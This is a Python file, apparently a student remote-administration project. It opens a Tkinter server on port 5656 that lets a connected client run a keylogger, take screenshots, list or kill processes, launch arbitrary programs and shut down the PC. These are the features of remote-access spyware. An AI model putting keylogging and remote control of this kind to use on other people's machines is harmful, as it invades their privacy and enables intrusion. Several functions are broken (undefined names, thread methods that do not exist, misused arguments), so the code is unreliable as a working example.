import socket
import os
import sys
import winreg
import subprocess
import io
import threading
from mss import mss
import psutil
import tkinter as tk
from tkinter import messagebox
from Keylog import InterceptKeys
from Program import Program

class Server(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("Server")
        self.geometry("300x200")

        self.start_button = tk.Button(self, text="Start Server", command=self.start_server)
        self.start_button.pack(pady=20)

        self.stop_button = tk.Button(self, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def start_server(self):
        Program.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Program.server.bind(('', 5656))
        Program.server.listen(100)
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        print("Server started, waiting for client...")
        print("IP Address:", ip_address)

        Program.client, addr = Program.server.accept()
        Program.ns = Program.client.makefile('rwb')

        print("Client connected at:", addr)

        Program.nr = io.TextIOWrapper(Program.ns, encoding='utf-8')
        Program.nw = io.TextIOWrapper(Program.ns, encoding='utf-8')

        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        self.handle_data()

    def stop_server(self):
        Program.nr.close()
        Program.nw.close()
        Program.ns.close()
        Program.client.close()
        Program.server.close()

        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def receive_data(self):
        try:
            print('Receiving data...')
            data = Program.nr.readline()
            print('Received '+data)
            return data.rstrip('\r\n')
        except Exception as e:
            print('Error while receiving data:', str(e))
            return "QUIT"

    def handle_data(self):
        print('Handling data...')
        while True:
            data = self.receive_data()
            print(data)
            if data == "KEYLOG":
                self.keylog()
            elif data == "SHUTDOWN":
                self.shutdown()
            elif data == "REGISTRY":
                self.registry()
            elif data == "TAKEPIC":
                self.takepic()
            elif data == "PROCESS":
                self.process()
            elif data == "APPLICATION":
                self.application()
            elif data == "QUIT":
                break
            else:
                print('Unknown command: ', data);
                break

        Program.client.shutdown(socket.SHUT_RDWR)
        Program.client.close()
        pass

    def on_closing(self):
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            if (Program.client != None):
                self.stop_server()
            self.destroy()

    def shutdown(self):
        subprocess.run("shutdown -s", shell=True)

    def hook_key(self, tklog):
        tklog.resume()
        with open(appstart.path, "w") as file:
            file.write("")

    def unhook(self, tklog):
        tklog.suspend()

    def print_keys(self):
        s = ""
        with open(appstart.path, "r") as file:
            s = file.read()
        with open(appstart.path, "w") as file:
            file.write("")
        if s == "":
            s = "\0"
        Program.nw.write(s)
        Program.nw.flush()

    def keylog(self):
        tklog = threading.Thread(target=InterceptKeys.startKLog)
        s = ""
        tklog.start()
        tklog.suspend()
        while True:
            self.receive_signal(s)
            if s == "PRINT":
                self.print_keys()
            elif s == "HOOK":
                self.hook_key(tklog)
            elif s == "UNHOOK":
                self.unhook(tklog)
            elif s == "QUIT":
                return

    def takepic(self):
        with mss() as sct:
            img = sct.shot()

        Program.nw.write(str(img)+'\n')
        Program.nw.flush()
        pass

    def process(self):
        while True:
            data = self.receive_signal()

            if data == "LIST":
                for p in psutil.process_iter():
                    Program.nw.write(str(p.name()) + '\n')

            elif data == "KILL":
                pid = int(Program.nr.readline())
                p = psutil.Process(pid)
                p.kill()
              
            elif data == "QUIT":
                break

            else:
                pass  

    def application(self):
        ss = ""
        pr = []
        while True:
            ss = self.receive_signal()
            print(ss)
            if ss == "XEM":   
                try:
                    app_list = []
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            app = psutil.Process(proc.pid)
                            app_name = app.name()  # Retrieve the application name
                            num_threads = app.num_threads()  # Retrieve the number of threads associated with the application
                            app_list.append((app_name, proc.pid, num_threads))
                        except (psutil.AccessDenied, psutil.NoSuchProcess) as e:
                            print("Error retrieving application information:", str(e))

                    print("Number of running applications:", len(app_list))
                    Program.nw.write(str(len(app_list))+'\n');
                    Program.nw.flush()
                    print("Application details:")
                    for app_name, pid, num_threads in app_list:
                        Program.nw.write(app_name + '\n')
                        Program.nw.flush()
                        Program.nw.write(str(pid) + '\n')  # Convert pid to string before writing
                        Program.nw.flush()
                        Program.nw.write(str(num_threads) + '\n')  # Convert num_threads to string before writing
                        Program.nw.flush()
                except Exception as e:
                    messagebox.showerror("Error",f"Error retrieving application:{e}")
            elif ss == "KILL":
                try:
                    pid = int(Program.nr.readline().strip())
                    process = psutil.Process(pid)
                    process.terminate()
                    messagebox.showinfo("Success", "Application with PID {} has been terminated.".format(pid))
                except psutil.NoSuchProcess:
                    messagebox.showerror('Error', f'No such application:{pid}')
                except Exception as e:
                    messagebox.showerror('Error', f'Error terminating application:{e}')
            elif ss == "START":
                try:
                    app_name = Program.nr.readline().strip()
                    print(app_name)
                    subprocess.Popen(app_name)
                    messagebox.showinfo("Success",f"Started application: {app_name}")
                except FileNotFoundError:
                    print(f"Application '{app_name}' not found")
                    messagebox.showerror("Error",f"Application '{app_name}' not found\n")
                except Exception as e:
                    print(f"Error occurred while starting application: {e}")
                    messagebox.showerror("Error",f"Error occurred while starting application: {e}\n")
            elif ss == "QUIT":
                break


    def receive_signal(self):
        signal = Program.nr.readline().strip()
        return signal


if __name__ == "__main__":
    server = Server()
    server.mainloop()